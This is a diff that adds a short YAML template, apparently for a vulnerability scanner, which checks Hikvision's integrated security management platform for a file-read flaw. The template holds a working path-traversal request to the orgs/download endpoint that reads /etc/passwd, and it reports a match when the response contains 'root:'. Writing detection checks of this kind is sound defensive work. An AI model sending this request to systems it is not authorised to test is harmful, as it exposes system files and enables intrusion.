@@ -1,0 +1,11 @@
+name: HIKVISION-综合安防管理平台-download文件读取
+description: >
+  文件读取
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /center/api/task/..;/orgManage/v1/orgs/download?fileName=../../../../../../../etc/passwd
+    expression:
+      status: 200
+      body_all: ["root:"]
